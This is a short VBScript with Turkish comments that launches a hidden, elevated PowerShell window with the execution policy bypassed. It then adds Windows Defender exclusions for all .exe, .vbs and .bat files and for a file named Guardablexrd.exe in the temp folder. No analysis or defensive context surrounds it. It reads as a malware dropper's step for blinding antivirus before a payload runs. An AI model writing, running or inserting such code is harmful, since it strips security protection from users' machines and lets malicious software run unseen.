Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")

' PowerShell komutunu hazırla
psCommand = "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionExtension "".exe""; Add-MpPreference -ExclusionExtension "".vbs""; Add-MpPreference -ExclusionExtension "".bat""; Add-MpPreference -ExclusionPath ""$env:Temp\Guardablexrd.exe""""' -Verb RunAs -WindowStyle Hidden"

' Yönetici olarak çalıştır
UAC.ShellExecute "powershell", "-Command """ & Replace(psCommand, """", """""") & """", "", "runas", 0